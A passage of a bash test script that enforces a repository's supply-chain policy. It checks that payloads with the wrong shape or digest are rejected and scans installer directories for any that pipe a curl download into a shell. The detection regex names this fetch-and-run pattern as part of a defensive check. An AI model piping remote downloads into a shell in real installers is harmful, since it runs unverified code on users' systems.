' _ "$repo_root" "$shape_target" 2>&1)"; then
  printf 'A wrong digest was accepted.\n' >&2
  exit 1
fi
assert_contains "$digest_output" 'SHA-256 mismatch for the payload'
printf 'PASS: wrong-shape and wrong-digest content is rejected\n'

# --- No installer pipes remote content into a shell -------------------------

piped_downloads="$(grep -rnE 'curl[^|]*\|[[:space:]]*(sudo[[:space:]]+)?(ba)?sh' \
  "$repo_root/common" "$repo_root/scripts" "$repo_root/platforms" 2>/dev/null |
  grep -vE ':[[:space:]]*#' || true)"
if [[ -n "$piped_downloads" ]]; then
  printf 'An installer still pipes a download into a shell:\n%s\n' \
    "$piped_downloads" >&2
  exit 1
fi
printf 'PASS: no installer pipes a download straight into a shell\n'

printf 'Supply-chain policy tests passed.\n'
